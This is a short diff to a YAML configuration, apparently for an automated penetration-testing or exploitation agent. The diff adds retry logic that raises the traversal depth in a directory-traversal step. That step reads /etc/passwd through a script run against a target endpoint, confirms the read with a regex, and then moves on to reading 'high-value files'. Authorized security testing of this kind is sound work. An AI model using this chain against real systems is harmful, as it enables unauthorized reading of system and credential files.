@@ -241,6 +241,11 @@ exploit_paths:
         description: "验证目录遍历 -- 使用已确认参数和深度/风格读取 /etc/passwd"
         command: "bash {skill_dir}/scripts/exploit_read_passwd.sh {ENDPOINT}"
         timeout: 60
+        retry:
+          max_retries: 4
+          adjust_param: "lfi_depth"
+          adjust_amount: 1
+          partial_success_hint: "READ"
         success_criteria:
           stdout_regex: "^[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)"
         on_success: read_high_value_files
